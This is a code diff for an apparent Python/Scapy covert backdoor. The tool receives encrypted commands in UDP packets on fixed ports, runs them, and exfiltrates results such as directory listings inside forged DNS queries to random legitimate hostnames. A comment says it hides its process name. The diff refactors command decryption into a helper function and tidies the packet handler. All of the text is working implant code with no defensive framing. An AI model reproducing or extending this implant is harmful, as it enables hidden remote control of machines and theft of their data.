@@ -21,7 +21,6 @@ e.read_nonce("nonce.bin")
 e.read_secret("secret.key")
 e.initialize_encryption_context()
 
-
 class DirectoryNotFound(Exception): pass
 
 def get_random_hostname():
@@ -29,9 +28,16 @@ def get_random_hostname():
     index = randint(0, size-1)
     return hostnames[index]
 
+def receive_dns_command(pkt):
+    msg_len = pkt[UDP].len
+    ciphertext = bytes(pkt[UDP].payload)[0:msg_len]
+    msg_bytes = e.decrypt(ciphertext)
+    msg = msg_bytes.decode("utf-8")
+    return msg
+
 def send_dns_query(query):
     # Send the query.
-    send(query)
+    send(query, verbose=0)
 
 def forge_dns_query(data: str):
     # Choose random legitimate hostname.
@@ -57,11 +63,8 @@ def packet_handler(pkt):
     # Do nothing if not the correct packet.
     if pkt[UDP].sport != 10069 or pkt[UDP].dport != 10420:
         return
-    # Decrypt the message.
-    msg_len = pkt[UDP].len
-    ciphertext = bytes(pkt[UDP].payload)[0:msg_len]
-    msg_bytes = e.decrypt(ciphertext)
-    command = msg_bytes.decode("utf-8")
+    # Decrypt the command.
+    command = receive_dns_command(pkt)
     print(f"Received: {command}")
     # Check command and perform operation
     argv = command.split(" ")
@@ -86,8 +89,6 @@ def packet_handler(pkt):
             send_dns_query(query)
             print("Sent directory contents")
             return
-    else:
-        return
 
 if __name__ == "__main__":
     # Hide process name.
